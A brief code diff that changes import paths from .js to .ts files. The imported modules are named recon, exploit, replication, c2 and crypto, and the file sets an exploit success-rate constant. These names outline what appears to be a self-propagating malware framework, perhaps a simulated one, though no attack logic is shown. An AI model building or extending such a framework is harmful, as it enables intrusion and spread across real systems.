@@ -1,10 +1,11 @@
-import * as recon from './modules/recon.js';
-import * as exploit from './modules/exploit.js';
-import * as replication from './modules/replication.js';
-import { reportFailure } from './modules/c2.js';
-import { generateKey, rotateKey } from './modules/crypto.js';
-import { initializeConnector } from './modules/connector.js';
-import { logger } from './utils/logger.js';
+
+import * as recon from './modules/recon.ts';
+import * as exploit from './modules/exploit.ts';
+import * as replication from './modules/replication.ts';
+import { reportFailure } from './modules/c2.ts';
+import { generateKey, rotateKey } from './modules/crypto.ts';
+import { initializeConnector } from './modules/connector.ts';
+import { logger } from './utils/logger.ts';
 import vm from 'vm';
 
 const EXPLOIT_SUCCESS_RATE = 0.3; // 30% chance of success
